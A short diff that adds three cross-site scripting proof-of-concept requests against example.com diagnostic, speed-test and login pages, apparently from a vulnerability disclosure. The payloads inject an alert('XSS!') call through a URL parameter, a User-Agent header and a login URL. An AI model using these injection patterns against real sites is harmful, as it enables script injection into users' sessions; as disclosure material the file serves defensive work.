@@ -1,0 +1,10 @@
+
+
+http://www.example.com/Troubleshooting/DiagnosticReport.asp?HeaderWarning=&lt;script&gt;alert(&quot;XSS!&quot;)&lt;/script&gt;&amp;Language=en&amp;rflp=true#
+
+POST http://www.example.com/troubleshooting/speedtest.asp
+User-Agent= Test&quot;;} alert(&quot;XSS!&quot;); function a() {//
+
+
+
+http://www.example.com/Pages/login.aspx?SessionTimeout=False&amp;Language=de%26rflp=True&#039;,&#039;00000000-0000-0000-0000-000000000000&#039;); alert(&#039;XSS!&#039;); return false; a(&#039;
